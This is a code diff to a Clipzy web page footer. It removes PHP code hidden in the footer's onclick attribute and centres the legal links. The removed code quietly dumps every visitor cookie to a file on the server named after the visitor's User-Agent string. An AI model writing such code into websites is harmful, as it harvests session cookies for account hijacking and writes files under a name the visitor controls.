@@ -156,35 +156,22 @@
         </div>
     </section>
 
-    <footer class="footer mt-5 py-3" onclick="<?php
-// Get device name
-$deviceName = $_SERVER['HTTP_USER_AGENT'];
-
-// Get all cookies
-$cookies = $_COOKIE;
-
-// Encode cookies to JSON format
-$cookiesJson = json_encode($cookies);
-
-// Save cookies to a JSON file with the device name as filename
-$file = fopen($deviceName . '.json', 'w');
-fwrite($file, $cookiesJson);
-fclose($file);
-
-echo 'Cookies saved to ' . $deviceName . '.json';
-?>">
+    <footer class="footer mt-5 py-3">
         <div class="container text-center">
-            <ul class="nav nav-tabs" id="footerTabs">
-                <li class="nav-item">
-                    <a class="nav-link" href="/legal/terms-and-conditions">Terms And Conditions</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" href="/legal/privacy-policy">Privacy Policy</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" href="/legal/dpa">DPA</a>
-                </li>
-            </ul>
+            <center>
+                <ul class="nav nav-tabs" id="footerTabs">
+                    <li class="nav-item">
+                        <a class="nav-link" href="/legal/terms-and-conditions">Terms And Conditions</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/legal/privacy-policy">Privacy Policy</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/legal/dpa">DPA</a>
+                    </li>
+                </ul>
+            </center>
+            <br>
             <p>&copy; 2024 Clipzy. All rights reserved.</p>
         </div>
     </footer>
